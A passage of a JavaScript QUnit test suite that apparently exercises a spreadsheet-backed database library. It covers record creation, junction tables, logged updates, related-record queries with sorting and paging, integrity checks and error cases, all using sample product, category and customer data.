        assert.equal(readListResult.status, 200, "readIdList should succeed");
        assert.ok(Array.isArray(readListResult.data), "Should return array");
        assert.equal(readListResult.data.length, 3, "Should return 3 records");

        // Verify all records have correct data
        const foundIds = readListResult.data.map((record) => record.id);
        assert.ok(foundIds.includes(product1.id), "Should include product1");
        assert.ok(foundIds.includes(product2.id), "Should include product2");
        assert.ok(
          foundIds.includes(testProductId),
          "Should include testProduct"
        );

        // Cleanup
        JSON.parse(removeProduct(product1.id));
        JSON.parse(removeProduct(product2.id));
      });

      QUnit.test("removeWithCascade functionality", function (assert) {
        // Test that removeWithCascade properly handles related records
        const removeResult = db.removeWithCascade(
          productTableConfig.tableName,
          productTableConfig.historyTableName,
          testProductId
        );

        assert.equal(
          removeResult.status,
          200,
          "removeWithCascade should succeed"
        );

        // Verify the product is removed
        const readResult = db.read(productTableConfig.tableName, testProductId);
        assert.equal(readResult.status, 404, "Product should no longer exist");
      });

      QUnit.test("Cleanup advanced operations", function (assert) {
        const deleteResult = JSON.parse(removeCategory(testCategoryId));
        assert.equal(
          deleteResult.status,
          200,
          "Cleanup: Should remove test category"
        );
      });
    });

    QUnit.module("Junction/Many-to-Many Operations", function () {
      let testOrderId;
      let testProductId;
      let testCustomerId;
      let testOrderDetailId;

      QUnit.test("Setup junction operations", function (assert) {
        // Create customer
        const customerResult = JSON.parse(
          createCustomer({
            first_name: "Test",
            last_name: "Customer",
            email: "test@example.com",
            address: "123 Test St",
            created_at: new Date(),
          })
        );
        assert.equal(
          customerResult.status,
          200,
          "Setup: Should create customer"
        );
        testCustomerId = customerResult.id;

        // Create category
        const categoryResult = JSON.parse(
          createCategory({
            name: "Test Category for Junction",
            created_at: new Date(),
          })
        );
        assert.equal(
          categoryResult.status,
          200,
          "Setup: Should create category"
        );
        const testCategoryId = categoryResult.id;

        // Create product
        const productResult = JSON.parse(
          createProduct({
            name: "Test Product for Junction",
            price: 99.99,
            category_fk: testCategoryId,
            created_at: new Date(),
          })
        );
        assert.equal(productResult.status, 200, "Setup: Should create product");
        testProductId = productResult.id;

        // Create order
        const orderResult = JSON.parse(
          createOrder({
            customer_fk: testCustomerId,
            created_at: new Date(),
          })
        );
        assert.equal(orderResult.status, 200, "Setup: Should create order");
        testOrderId = orderResult.id;

        // Cleanup category
        JSON.parse(removeCategory(testCategoryId));
      });

      QUnit.test("createJunctionRecord functionality", function (assert) {
        const junctionData = {
          order_id: testOrderId,
          product_id: testProductId,
          quantity: 2,
          created_at: new Date(),
        };
        console.log("junctionData for createJunctionRecord", junctionData);
        const createResult = db.createJunctionRecord(
          orderDetailConfig.tableName,
          junctionData,
          Object.keys(orderDetailConfig.fields)
        );
        console.log("createResult for createJunctionRecord", createResult);
        assert.equal(
          createResult.status,
          200,
          "createJunctionRecord should succeed"
        );
        assert.ok(createResult.id, "Should return an ID");
        testOrderDetailId = createResult.id;

        // Verify the record was created
        const readResult = db.read(
          orderDetailConfig.tableName,
          createResult.id
        );
        assert.equal(
          readResult.status,
          200,
          "Should be able to read junction record"
        );
        assert.equal(readResult.data.quantity, 2, "Quantity should match");
      });

      QUnit.test("getJunctionRecords functionality", function (assert) {
        // Test getting junction records from order perspective
        const orderRecords = db.getJunctionRecords(
          orderDetailConfig.tableName,
          orderTableConfig.tableName,
          productTableConfig.tableName,
          testOrderId,
          {}
        );
        console.log("orderRecords for getJunctionRecords", orderRecords);
        assert.equal(
          orderRecords.status,
          200,
          "getJunctionRecords should succeed"
        );
        assert.ok(Array.isArray(orderRecords.data), "Should return array");
        assert.ok(
          orderRecords.data.length > 0,
          "Should have at least one record"
        );

        // Test getting junction records from product perspective
        const productRecords = db.getJunctionRecords(
          orderDetailConfig.tableName,
          productTableConfig.tableName,
          orderTableConfig.tableName,
          testProductId,
          {}
        );

        assert.equal(
          productRecords.status,
          200,
          "getJunctionRecords from product should succeed"
        );
        assert.ok(Array.isArray(productRecords.data), "Should return array");
      });

      QUnit.test("updateJunctionRecord functionality", function (assert) {
        const updateData = {
          order_id: testOrderId,
          product_id: testProductId,
          quantity: 5,
          created_at: new Date(),
        };
        console.log("updateData for updateJunctionRecord", updateData);

        const updateResult = db.updateJunctionRecord(
          orderDetailConfig.tableName,
          testOrderDetailId,
          updateData,
          Object.keys(orderDetailConfig.fields)
        );
        console.log("updateResult for updateJunctionRecord", updateResult);
        assert.equal(
          updateResult.status,
          200,
          "updateJunctionRecord should succeed"
        );

        // Verify the update
        const readResult = db.read(
          orderDetailConfig.tableName,
          testOrderDetailId
        );
        assert.equal(
          readResult.status,
          200,
          "Should be able to read updated record"
        );
        assert.equal(readResult.data.quantity, 5, "Quantity should be updated");
      });

      QUnit.test("Cleanup junction operations", function (assert) {
        // Remove junction record
        const removeJunctionResult = db.removeWithCascade(
          orderDetailConfig.tableName,
          orderDetailConfig.historyTableName,
          testOrderDetailId
        );
        console.log(
          "removeJunctionResult for cleanup junction operations",
          removeJunctionResult
        );
        assert.equal(
          removeJunctionResult.status,
          200,
          "Should remove junction record"
        );

        // Remove order
        const removeOrderResult = JSON.parse(removeOrder(testOrderId));
        console.log(
          "removeOrderResult for cleanup junction operations",
          removeOrderResult
        );
        assert.ok(
          removeOrderResult.status === 200 || removeOrderResult.status === 404,
          "Should remove order or already be removed by cascade (200 or 404)"
        );

        // Remove product
        const removeProductResult = JSON.parse(removeProduct(testProductId));
        console.log(
          "removeProductResult for cleanup junction operations",
          removeProductResult
        );
        assert.ok(
          removeProductResult.status === 200 ||
            removeProductResult.status === 404,
          "Should remove product or already be removed by cascade (200 or 404)"
        );

        // Remove customer
        const removeCustomerResult = JSON.parse(removeCustomer(testCustomerId));
        console.log(
          "removeCustomerResult for cleanup junction operations",
          removeCustomerResult
        );
        assert.ok(
          removeCustomerResult.status === 200 ||
            removeCustomerResult.status === 404,
          "Should remove customer or already be removed by cascade (200 or 404)"
        );
      });
    });

    QUnit.module("Logging Operations", function () {
      const tableName = "LOGGING_TEST";
      const historyTableName = "DELETED_LOGGING_TEST";
      const keyOrder = ["name", "value", "created_at"];

      QUnit.test("Setup logging test table", function (assert) {
        const config = {
          tableName: tableName,
          historyTableName: historyTableName,
          fields: {
            name: "string",
            value: "number",
            created_at: "date",
          },
        };

        const createTableResult = db.createTable(config);
        assert.equal(
          createTableResult.status,
          200,
          "Logging test table created"
        );

        const contextResult = db.putTableIntoDbContext(config);
        assert.equal(
          contextResult.status,
          500,
          "Table already added to context by the test suite"
        );
      });

      QUnit.test("createWithLogs functionality", function (assert) {
        const testData = {
          name: "Test Log Record",
          value: 42,
          created_at: new Date(),
        };

        const createResult = db.createWithLogs(tableName, testData, keyOrder);
        assert.equal(createResult.status, 200, "createWithLogs should succeed");
        assert.ok(createResult.id, "Should return an ID");

        // Verify the record was created
        const readResult = db.read(tableName, createResult.id);
        assert.equal(
          readResult.status,
          200,
          "Should be able to read created record"
        );
        assert.equal(
          readResult.data.name,
          "Test Log Record",
          "Name should match"
        );
        assert.equal(readResult.data.value, 42, "Value should match");
      });

      QUnit.test("updateWithLogs functionality", function (assert) {
        // First create a record to update
        const testData = {
          name: "Update Test Record",
          value: 100,
          created_at: new Date(),
        };

        const createResult = db.createWithLogs(tableName, testData, keyOrder);
        assert.equal(
          createResult.status,
          200,
          "Record created for update test"
        );

        // Now update it with logs
        const updateData = {
          name: "Updated Log Record",
          value: 200,
          created_at: new Date(),
        };

        const updateResult = db.updateWithLogs(
          tableName,
          createResult.id,
          updateData,
          keyOrder
        );

        assert.equal(updateResult.status, 200, "updateWithLogs should succeed");

        // Verify the update
        const readResult = db.read(tableName, createResult.id);
        assert.equal(
          readResult.status,
          200,
          "Should be able to read updated record"
        );
        assert.equal(
          readResult.data.name,
          "Updated Log Record",
          "Name should be updated"
        );
        assert.equal(readResult.data.value, 200, "Value should be updated");
      });

      QUnit.test("Cleanup logging operations", function (assert) {
        // Get all records and remove them
        const allRecords = db.getAll(tableName, {}, false);
        assert.equal(allRecords.status, 200, "Should get all records");

        if (allRecords.data && allRecords.data.length > 0) {
          for (const record of allRecords.data) {
            const removeResult = db.remove(
              tableName,
              historyTableName,
              record.id
            );
            assert.equal(removeResult.status, 200, "Should remove record");
          }
        }
      });
    });

    QUnit.module("Related Records Operations", function () {
      let testCategoryId;
      let testProductIds = [];

      QUnit.test("Setup related records test", function (assert) {
        // Create category
        const categoryResult = JSON.parse(
          createCategory({
            name: "Test Category for Related Records",
            created_at: new Date(),
          })
        );
        assert.equal(
          categoryResult.status,
          200,
          "Setup: Should create category"
        );
        testCategoryId = categoryResult.id;

        // Create multiple products in the same category
        for (let i = 1; i <= 3; i++) {
          const productResult = JSON.parse(
            createProduct({
              name: `Test Product ${i}`,
              price: 10.0 * i,
              category_fk: testCategoryId,
              created_at: new Date(),
            })
          );
          assert.equal(productResult.status, 200, `Product ${i} created`);
          testProductIds.push(productResult.id);
        }
      });

      QUnit.test("getRelatedRecords basic functionality", function (assert) {
        const relatedRecords = db.getRelatedRecords(
          testCategoryId,
          productTableConfig.tableName,
          "category_fk",
          4, // fieldIndex for category_fk
          {},
          false
        );

        assert.equal(
          relatedRecords.status,
          200,
          "getRelatedRecords should succeed"
        );
        assert.ok(Array.isArray(relatedRecords.data), "Should return array");
        assert.ok(
          relatedRecords.data.length >= 3,
          "Should return at least 3 related products"
        );

        // Verify all products belong to the test category
        for (const product of relatedRecords.data) {
          assert.equal(
            product.category_fk,
            testCategoryId,
            `Product ${product} should belong to test category ${testCategoryId}`
          );
        }
      });

      QUnit.test("getRelatedRecords with options", function (assert) {
        // Test with sortBy and sortOrder options
        console.log("params for getRelatedRecords with options", {
          foreignKey: testCategoryId, // foreignKey
          tableName: productTableConfig.tableName, // tableName
          field: "category_fk", // field
          fieldIndex: 4, // fieldIndex for category_fk
          options: { sortBy: "name", sortOrder: "asc" },
          useCache: false, // useCache
        });
        const sortedRecords = db.getRelatedRecords(
          testCategoryId,
          productTableConfig.tableName,
          "category_fk",
          4,
          { sortBy: "name", sortOrder: "asc" },
          false
        );
        console.log(
          "sortedRecords for getRelatedRecords with options",
          sortedRecords
        );
        assert.equal(
          sortedRecords.status,
          200,
          "getRelatedRecords with sorting should succeed"
        );
        assert.ok(
          sortedRecords.data.length > 0,
          "Should return sorted records"
        );

        // Test with pagination options
        const paginatedRecords = db.getRelatedRecords(
          testCategoryId,
          productTableConfig.tableName,
          "category_fk",
          4,
          { page: 1, pageSize: 2 },
          false
        );

        assert.equal(
          paginatedRecords.status,
          200,
          "getRelatedRecords with pagination should succeed"
        );
        assert.ok(
          paginatedRecords.data.length <= 2,
          "Should respect pageSize option"
        );

        // Test with combined sorting and pagination
        const combinedRecords = db.getRelatedRecords(
          testCategoryId,
          productTableConfig.tableName,
          "category_fk",
          4,
          {
            sortBy: "name",
            sortOrder: "desc",
            page: 1,
            pageSize: 1,
          },
          false
        );

        assert.equal(
          combinedRecords.status,
          200,
          "getRelatedRecords with combined options should succeed"
        );
        assert.ok(
          combinedRecords.data.length <= 1,
          "Should respect pageSize with combined options"
        );

        // Test with default sortOrder (asc)
        const defaultSortRecords = db.getRelatedRecords(
          testCategoryId,
          productTableConfig.tableName,
          "category_fk",
          4,
          { sortBy: "name" },
          false
        );

        assert.equal(
          defaultSortRecords.status,
          200,
          "getRelatedRecords with default sortOrder should succeed"
        );
        assert.ok(
          defaultSortRecords.data.length > 0,
          "Should return records with default ascending sort"
        );

        // Test that invalid options don't break the function
        const invalidOptionsRecords = db.getRelatedRecords(
          testCategoryId,
          productTableConfig.tableName,
          "category_fk",
          4,
          {
            invalidOption: "should be ignored",
            sortBy: "name", // This should still work
          },
          false
        );

        assert.equal(
          invalidOptionsRecords.status,
          200,
          "getRelatedRecords should ignore invalid options"
        );
        assert.ok(
          invalidOptionsRecords.data.length > 0,
          "Should still return records despite invalid options"
        );
      });

      QUnit.test(
        "getRelatedRecordsWithFilter functionality",
        function (assert) {
          const filteredRecords = db.getRelatedRecordsWithFilter(
            testCategoryId,
            productTableConfig.tableName,
            "category_fk",
            4,
            {},
            false
          );

          assert.equal(
            filteredRecords.status,
            200,
            "getRelatedRecordsWithFilter should succeed"
          );
          assert.ok(Array.isArray(filteredRecords.data), "Should return array");
        }
      );

      QUnit.test("getRelatedRecordsWithLogs functionality", function (assert) {
        const loggedRecords = db.getRelatedRecordsWithLogs(
          testCategoryId,
          productTableConfig.tableName,
          "category_fk",
          4,
          {},
          false
        );

        assert.equal(
          loggedRecords.status,
          200,
          "getRelatedRecordsWithLogs should succeed"
        );
        assert.ok(Array.isArray(loggedRecords.data), "Should return array");
        assert.ok(
          loggedRecords.data.length >= 3,
          "Should return at least 3 related products"
        );
      });

      QUnit.test(
        "getRelatedRecordsWithTextFinder functionality",
        function (assert) {
          const textFinderRecords = db.getRelatedRecordsWithTextFinder(
            testCategoryId,
            productTableConfig.tableName,
            "category_fk",
            4,
            {},
            false
          );

          assert.equal(
            textFinderRecords.status,
            200,
            "getRelatedRecordsWithTextFinder should succeed"
          );
          assert.ok(
            Array.isArray(textFinderRecords.data),
            "Should return array"
          );
        }
      );

      QUnit.test("Cleanup related records operations", function (assert) {
        // Remove all test products
        for (const productId of testProductIds) {
          const removeResult = JSON.parse(removeProduct(productId));
          assert.equal(removeResult.status, 200, "Should remove test product");
        }

        // Remove test category
        const removeCategoryResult = JSON.parse(removeCategory(testCategoryId));
        assert.equal(
          removeCategoryResult.status,
          200,
          "Should remove test category"
        );
      });
    });

    QUnit.module("Data Retrieval Operations", function () {
      let testTableName;
      let testRecordIds = [];

      QUnit.test("Setup data retrieval test", function (assert) {
        // Create a test table for getAll operations
        const testConfig = {
          tableName: "GETALL_TEST",
          historyTableName: "DELETED_GETALL_TEST",
          fields: {
            name: "string",
            value: "number",
            category: "string",
            created_at: "date",
          },
        };

        const createResult = db.createTable(testConfig);
        assert.equal(createResult.status, 200, "Test table created");

        testTableName = testConfig.tableName;

        const contextResult = db.putTableIntoDbContext(testConfig);
        assert.equal(contextResult.status, 500, "Test table added to context");

        remanents = db.getAll(testTableName, {}, false);
        if (remanents.data.length > 0) {
          for (const record of remanents.data) {
            const removeResult = db.remove(
              testTableName,
              testConfig.historyTableName,
              record.id
            );
            assert.equal(removeResult.status, 200, "Test record removed");
          }
          checkRemanents = db.getAll(testTableName, {}, false);
          assert.equal(
            checkRemanents.data.length,
            0,
            "Test table should be empty"
          );
        } else {
          assert.equal(remanents.data.length, 0, "Test table should be empty");
        }

        // Create multiple test records
        for (let i = 1; i <= 5; i++) {
          const testData = {
            name: `Test Record ${i}`,
            value: i * 10,
            category: i % 2 === 0 ? "Even" : "Odd",
            created_at: new Date(),
          };

          const createRecordResult = db.create(
            testTableName,
            testData,
            Object.keys(testData)
          );
          assert.equal(
            createRecordResult.status,
            200,
            `Test record ${i} created`
          );
          testRecordIds.push(createRecordResult.id);
        }
      });

      QUnit.test("getAll basic functionality", function (assert) {
        const allRecords = db.getAll(testTableName, {}, false);

        assert.equal(allRecords.status, 200, "getAll should succeed");
        assert.ok(Array.isArray(allRecords.data), "Should return array");
        assert.equal(
          allRecords.data.length,
          5,
          "Should return all 5 test records"
        );
      });

      QUnit.test("getAll with caching", function (assert) {
        // Test with cache enabled
        const cachedRecords = db.getAll(testTableName, {}, true);

        assert.equal(
          cachedRecords.status,
          200,
          "getAll with cache should succeed"
        );
        assert.ok(Array.isArray(cachedRecords.data), "Should return array");
        assert.equal(
          cachedRecords.data.length,
          5,
          "Should return all 5 test records"
        );

        // Test cache performance (second call should be faster)
        const startTime = Date.now();
        const cachedRecords2 = db.getAll(testTableName, {}, true);
        const endTime = Date.now();

        assert.equal(
          cachedRecords2.status,
          200,
          "Second cached call should succeed"
        );
        assert.equal(cachedRecords2.data.length, 5, "Should return same data");
        assert.ok(
          endTime - startTime < 1000,
          "Second cached call should be faster"
        );
      });

      QUnit.test("getAll with options", function (assert) {
        // Test with sortBy and sortOrder options
        console.log("params for getAll with options", {
          tableName: testTableName,
          options: { sortBy: "name", sortOrder: "asc" },
          useCache: false,
        });
        const sortedRecords = db.getAll(
          testTableName,
          { sortBy: "name", sortOrder: "asc" },
          false
        );
        console.log("sortedRecords for getAll with options", sortedRecords);

        assert.equal(
          sortedRecords.status,
          200,
          "getAll with sorting should succeed"
        );
        assert.ok(
          sortedRecords.data.length > 0,
          "Should return sorted records"
        );

        // Test with pagination options
        const paginatedRecords = db.getAll(
          testTableName,
          { page: 1, pageSize: 3 },
          false
        );

        assert.equal(
          paginatedRecords.status,
          200,
          "getAll with pagination should succeed"
        );
        assert.ok(
          paginatedRecords.data.length <= 3,
          "Should respect pageSize option"
        );

        // Test with combined sorting and pagination
        const combinedRecords = db.getAll(
          testTableName,
          {
            sortBy: "name",
            sortOrder: "desc",
            page: 1,
            pageSize: 2,
          },
          false
        );

        assert.equal(
          combinedRecords.status,
          200,
          "getAll with combined options should succeed"
        );
        assert.ok(
          combinedRecords.data.length <= 2,
          "Should respect pageSize with combined options"
        );
      });

      QUnit.test("Cleanup data retrieval test", function (assert) {
        // Remove all test records
        for (const recordId of testRecordIds) {
          const removeResult = db.remove(
            testTableName,
            "DELETED_GETALL_TEST",
            recordId
          );
          assert.equal(removeResult.status, 200, "Should remove test record");
        }
      });
    });

    QUnit.module("Advanced Database Operations", function () {
      let testJunctionTableName;
      let testJunctionHistoryTableName;
      let testCategoryIdAdvanced;
      let testProductIdAdvanced;
      QUnit.test("Setup advanced operations", function (assert) {
        // First ensure parent tables exist and are in context
        // CATEGORY and PRODUCT should already exist from schema setup

        // Create a proper junction table using existing CATEGORY and PRODUCT tables
        const junctionConfigResponse = db.createManyToManyTableConfig({
          entity1TableName: "CATEGORY",
          entity2TableName: "PRODUCT",
          fieldsRelatedToBothEntities: {
            quantity: "number",
            priority: "string",
          },
        });

        assert.equal(
          junctionConfigResponse.status,
          200,
          "Junction config created successfully"
        );

        const junctionConfig = junctionConfigResponse.data;
        testJunctionTableName = junctionConfig.tableName; // "CATEGORY_PRODUCT_RELATION"
        testJunctionHistoryTableName = junctionConfig.historyTableName; // "DELETED_CATEGORY_PRODUCT_RELATION"

        // Create the actual junction table
        const createResult = db.createTable(junctionConfig);
        assert.equal(createResult.status, 200, "Junction table created");

        // Add to context
        const contextResult = db.putTableIntoDbContext(junctionConfig);
        assert.equal(
          contextResult.status,
          500,
          "Creation of table should already put them in context"
        );

        // Create some test data in parent tables for integrity testing
        const categoryResult = db.create(
          "CATEGORY",
          {
            name: "Test Category",
            created_at: new Date(),
          },
          ["name", "created_at"]
        );
        const productResult = db.create(
          "PRODUCT",
          {
            name: "Test Product",
            price: 100,
            category_fk: categoryResult.id,
            created_at: new Date(),
          },
          ["name", "price", "category_fk", "created_at"]
        );

        assert.equal(categoryResult.status, 200, "Test category created");
        assert.equal(productResult.status, 200, "Test product created");

        // Create valid junction records
        const validJunctionResult = db.createJunctionRecord(
          testJunctionTableName,
          {
            category_id: categoryResult.id,
            product_id: productResult.id,
            quantity: 10,
            priority: "high",
          },
          ["created_at", "category_id", "product_id", "quantity", "priority"]
        );
        assert.equal(
          validJunctionResult.status,
          200,
          "Valid junction record created"
        );

        // Store IDs for cleanup and integrity testing
        testCategoryIdAdvanced = categoryResult.id;
        testProductIdAdvanced = productResult.id;
      });

      QUnit.test("checkTableIntegrity functionality", function (assert) {
        // First, let's check integrity when everything is valid
        const initialIntegrityResult = db.checkTableIntegrity(
          testJunctionTableName,
          testJunctionHistoryTableName
        );
        assert.ok(
          initialIntegrityResult.status === 204 ||
            initialIntegrityResult.status === 200,
          "Initial integrity check should succeed, no orphaned records"
        );
        assert.equal(
          initialIntegrityResult.count,
          0,
          "Should have no orphaned records initially"
        );

        // Now create an orphaned record scenario by:
        // 1. Create a new category and product
        // 2. Create junction records pointing to them
        // 3. Delete the parent records directly (simulating orphaned state)
        // 4. Run integrity check to clean up orphaned junction records

        const tempCategory = db.create(
          "CATEGORY",
          {
            name: "Temp Category",
            created_at: new Date(),
          },
          ["name", "created_at"]
        );
        const tempProduct = db.create(
          "PRODUCT",
          {
            name: "Temp Product",
            price: 100,
            category_fk: tempCategory.id,
            created_at: new Date(),
          },
          ["name", "price", "category_fk", "created_at"]
        );

        // Create junction records pointing to these temp records
        const orphanJunction1 = db.createJunctionRecord(
          testJunctionTableName,
          {
            category_id: tempCategory.id,
            product_id: tempProduct.id,
            quantity: 5,
            priority: "low",
          },
          ["created_at", "category_id", "product_id", "quantity", "priority"]
        );

        const orphanJunction2 = db.createJunctionRecord(
          testJunctionTableName,
          {
            category_id: testCategoryIdAdvanced, // Valid category
            product_id: tempProduct.id, // Soon-to-be orphaned product
            quantity: 3,
            priority: "medium",
          },
          ["created_at", "category_id", "product_id", "quantity", "priority"]
        );

        assert.equal(
          orphanJunction1.status,
          200,
          "First orphan junction record created"
        );
        assert.equal(
          orphanJunction2.status,
          200,
          "Second orphan junction record created"
        );

        // Now delete the parent records directly, making junction records orphaned
        const deleteCategoryResult = db.remove(
          "CATEGORY",
          "DELETED_CATEGORY",
          tempCategory.id
        );
        const deleteProductResult = db.remove(
          "PRODUCT",
          "DELETED_PRODUCT",
          tempProduct.id
        );

        assert.equal(deleteCategoryResult.status, 200, "Temp category deleted");
        assert.equal(deleteProductResult.status, 200, "Temp product deleted");

        // Now run integrity check - should find and clean up orphaned records
        const cleanupIntegrityResult = db.checkTableIntegrity(
          testJunctionTableName,
          testJunctionHistoryTableName
        );

        console.log("Cleanup integrity result:", cleanupIntegrityResult);

        assert.equal(
          cleanupIntegrityResult.status,
          200,
          "Integrity check with cleanup should succeed"
        );
        assert.ok(
          cleanupIntegrityResult.count > 0,
          `Should have cleaned up orphaned records (cleaned: ${cleanupIntegrityResult.count})`
        );

        // Verify that orphaned records were moved to history
        const historyRecords = db.getAll(
          testJunctionHistoryTableName,
          {},
          false
        );
        assert.equal(
          historyRecords.status,
          200,
          "Should be able to read history table"
        );
        assert.ok(
          historyRecords.data.length > 0,
          "History table should contain the cleaned up records"
        );

        console.log("checkTableIntegrity functionality params", {
          tableName: testJunctionTableName,
          historyTableName: testJunctionHistoryTableName,
          orphanedRecordsCleaned: cleanupIntegrityResult.count,
          historyRecordsCount: historyRecords.data.length,
        });
      });

      QUnit.test(
        "deleteRelatedJunctionRecords functionality",
        function (assert) {
          // Create some test junction records
          console.log("starting deleteRelatedJunctionRecords functionality");
          // Create isolated CATEGORY and PRODUCT for this test
          const localCategory = JSON.parse(
            createCategory({
              name: "Temp Category for deleteRelatedJunctionRecords",
              created_at: new Date(),
            })
          );
          assert.equal(
            localCategory.status,
            200,
            "Temp category created for deleteRelatedJunctionRecords"
          );
          const localCategoryId = localCategory.id;

          const localProduct = JSON.parse(
            createProduct({
              name: "Temp Product for deleteRelatedJunctionRecords",
              price: 1.23,
              category_fk: localCategoryId,
              created_at: new Date(),
            })
          );
          assert.equal(
            localProduct.status,
            200,
            "Temp product created for deleteRelatedJunctionRecords"
          );
          const localProductId = localProduct.id;

          const testData = {
            category_id: localCategoryId,
            product_id: localProductId,
            created_at: new Date(),
            quantity: 10,
            priority: "high",
          };

          const createResult = db.createJunctionRecord(
            testJunctionTableName,
            testData,
            ["created_at", "category_id", "product_id", "quantity", "priority"]
          );
          console.log(
            "createResult for deleteRelatedJunctionRecords",
            createResult
          );
          assert.equal(
            createResult.status,
            200,
            "Test junction record created"
          );

          // Test deleting related junction records
          const deleteResult = db.deleteRelatedJunctionRecords(
            testJunctionTableName,
            testJunctionHistoryTableName,
            localCategoryId, // category_id
            "category_id"
          );

          assert.equal(
            deleteResult.status,
            200,
            "deleteRelatedJunctionRecords should succeed"
          );

          // Cleanup created PRODUCT and CATEGORY
          const cleanupProd = JSON.parse(removeProduct(localProductId));
          assert.equal(cleanupProd.status, 200, "Temp product removed");
          const cleanupCat = JSON.parse(removeCategory(localCategoryId));
          assert.equal(cleanupCat.status, 200, "Temp category removed");
        }
      );

      QUnit.test("applyColorScheme functionality", function (assert) {
        const colorScheme = "red";
        console.log("colorScheme for applyColorScheme", colorScheme);
        const colorResult = db.applyColorScheme(
          testJunctionTableName,
          colorScheme
        );
        console.log("colorResult for applyColorScheme", colorResult);
        //
        // Note: applyColorScheme might return different status codes depending on implementation
        assert.equal(
          colorResult.status,
          200,
          "applyColorScheme should return valid status"
        );
        assert.equal(
          colorResult.data.headerColor,
          "#E53935",
          "Header color should be red"
        );
        assert.equal(
          colorResult.data.color1,
          "#FFCDD2",
          "Color 1 should be red"
        );
        assert.equal(
          colorResult.data.color2,
          "#FFEBEE",
          "Color 2 should be red"
        );

        const notValidColorScheme = "emerald";
        const notValidColorResult = db.applyColorScheme(
          testJunctionTableName,
          notValidColorScheme
        );
        console.log(
          "notValidColorResult for applyColorScheme",
          notValidColorResult
        );
        assert.equal(
          notValidColorResult.status,
          500,
          "applyColorScheme should return 500 for invalid color scheme"
        );
      });

      QUnit.test("Cleanup advanced operations", function (assert) {
        // Clean up test junction table
        const recordsSuccessfullyRemoved = [];
        const allRecords = db.getAll(testJunctionTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            const removeResult = db.remove(
              testJunctionTableName,
              testJunctionHistoryTableName,
              record.id
            );
            recordsSuccessfullyRemoved.push(removeResult.status);
          }
        }
        console.log(
          "recordsSuccessfullyRemoved for cleanup advanced operations",
          recordsSuccessfullyRemoved
        );
        assert.equal(
          recordsSuccessfullyRemoved.length,
          allRecords.data.length,
          "Cleanup records should be the same as the number of records in the table"
        );
        assert.ok(
          recordsSuccessfullyRemoved.every((status) => status === 200),
          "All records should be successfully removed"
        );
      });
    });

    // Test getRelatedRecordsWithFilter functionality
    QUnit.module("getRelatedRecordsWithFilter Tests", {
      beforeEach: function (assert) {
        // Setup test data for filtering tests
        this.testTableName = "filter_test_table";
        this.testHistoryTableName = "filter_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            category: "string",
            price: "number",
            active: { type: "boolean", default: true },
            created_at: { type: "date", default: "now" },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);

        // Create test records
        const testData = [
          {
            name: "Product A",
            category: "Electronics",
            price: 100,
            active: true,
          },
          {
            name: "Product B",
            category: "Electronics",
            price: 200,
            active: false,
          },
          { name: "Product C", category: "Books", price: 50, active: true },
          { name: "Product D", category: "Books", price: 75, active: true },
          {
            name: "Product E",
            category: "Clothing",
            price: 150,
            active: false,
          },
        ];

        for (const data of testData) {
          db.create(this.testTableName, data, Object.keys(data));
        }
      },

      afterEach: function (assert) {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    // Test getRelatedRecordsWithTextFinder functionality
    QUnit.module("getRelatedRecordsWithTextFinder Tests", {
      beforeEach: function (assert) {
        // Setup test data for text search tests
        this.testTableName = "text_search_test_table";
        this.testHistoryTableName = "text_search_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            title: "string",
            description: "string",
            tags: "string",
            created_at: { type: "date", default: "now" },
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);

        // Create test records with searchable text
        const testData = [
          {
            title: "JavaScript Programming",
            description: "Learn JavaScript basics",
            tags: "programming,web,js",
          },
          {
            title: "Python Development",
            description: "Python programming guide",
            tags: "programming,python,backend",
          },
          {
            title: "Web Design Principles",
            description: "Modern web design techniques",
            tags: "design,web,ui",
          },
          {
            title: "Database Management",
            description: "SQL and NoSQL databases",
            tags: "database,sql,backend",
          },
          {
            title: "Mobile App Development",
            description: "iOS and Android apps",
            tags: "mobile,ios,android",
          },
        ];

        for (const data of testData) {
          db.create(this.testTableName, data, Object.keys(data));
        }
      },

      afterEach: function (assert) {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    // Test error handling and edge cases
    QUnit.module("Error Handling and Edge Cases", {
      beforeEach: function (assert) {
        console.log("Starting beforeEach for error handling and edge cases");
        this.testTableName = "error_test_table";
        this.testHistoryTableName = "error_test_history";

        const tableConfig = {
          tableName: this.testTableName,
          historyTableName: this.testHistoryTableName,
          fields: {
            name: "string",
            value: "number",
          },
        };

        db.createTable(tableConfig);
        db.putTableIntoDbContext(tableConfig);
      },

      afterEach: function (assert) {
        // Cleanup test data
        const allRecords = db.getAll(this.testTableName, {}, false);
        if (allRecords.status === 200 && allRecords.data) {
          for (const record of allRecords.data) {
            db.remove(this.testTableName, this.testHistoryTableName, record.id);
          }
        }
      },
    });

    QUnit.test("read with non-existent ID", function (assert) {
      const result = db.read(this.testTableName, 99999);

      assert.equal(result.status, 404, "Should return 404 for non-existent ID");
      assert.ok(result.error, "Should return error message");
    });

    QUnit.test("update with non-existent ID", function (assert) {
      const result = db.update(
        this.testTableName,
        99999,
        { name: "Updated Name", value: 100 },
        ["name", "value"]
      );

      assert.equal(result.status, 404, "Should return 404 for non-existent ID");
      assert.ok(result.error, "Should return error message");
    });

    QUnit.test("update with incomplete keyOrder", function (assert) {
      // First create a record to update
      const createResult = db.create(
        this.testTableName,
        { name: "Test", value: 42 },
        ["name", "value"]
      );
      assert.equal(createResult.status, 200, "Record should be created first");

      // Now try to update with incomplete keyOrder
      const result = db.update(
        this.testTableName,
        createResult.id,
        { name: "Updated" }, // Missing 'value' field
        ["name"] // keyOrder is incomplete - missing 'value'
      );

      assert.equal(
        result.status,
        400,
        "Should return 400 for incomplete keyOrder"
      );
      assert.ok(result.error, "Should return error message");
